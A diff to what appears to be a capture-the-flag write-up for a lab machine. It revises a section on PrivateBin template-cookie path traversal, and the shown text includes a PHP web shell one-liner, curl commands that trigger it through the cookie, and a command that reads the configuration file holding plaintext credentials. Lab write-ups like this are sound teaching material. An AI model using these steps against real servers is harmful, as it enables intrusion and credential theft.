@@ -195,15 +195,23 @@ drwxrwxrwx 5 root operator 4096 Mar 15 21:23 ..
 drwxrwxrwx 2 root operator 4096 Mar 15 21:23 b5
 ```
 
-### Web Shell via Template Cookie Injection
+### Template Cookie Injection
 
-PrivateBin's template selection feature uses a session cookie (`template`) to load a PHP template file from the `tpl/` directory. The path is not sanitized, allowing traversal into arbitrary directories. A PHP web shell dropped into `bd/b5/` can be loaded by pointing the cookie at that path.
+PrivateBin's template selection feature uses a session cookie (`template`) to load a PHP template file from the `tpl/` directory. 
+
+![](./screens/3.png)
+
+The path is not sanitized, allowing traversal into arbitrary directories. A PHP web shell dropped into `bd/b5/` can be loaded by pointing the cookie at that path.
 
 ```shell
 ben@kobold:/privatebin-data/data/bd/b5$ echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
 ```
 
-Verifying execution via curl:
+Execution via BurpSuite:
+
+![](./screens/4.png)
+
+Execution via curl:
 
 ```shell
 curl -k https://bin.kobold.htb/ \
@@ -213,25 +221,15 @@ curl -k https://bin.kobold.htb/ \
 uid=65534(nobody) gid=82(www-data) groups=82(www-data)
 ```
 
-Mostra immagine
-
-Mostra immagine
-
 ### Credentials Disclosure
 
-Reading the PrivateBin configuration file through the web shell:
-
-shell
+The PrivateBin configuration file can be read through the web shell, and it discloses plaintext credentials which can be used to access the Arcane application
 
 ```shell
 curl -k https://bin.kobold.htb/ \
   -b "template=../data/bd/b5/shell" \
   -G --data-urlencode "cmd=cat /srv/cfg/conf.php"
 ```
-
-The configuration file contains a commented-out MySQL model section with plaintext credentials:
-
-ini
 
 ```ini
 [model]
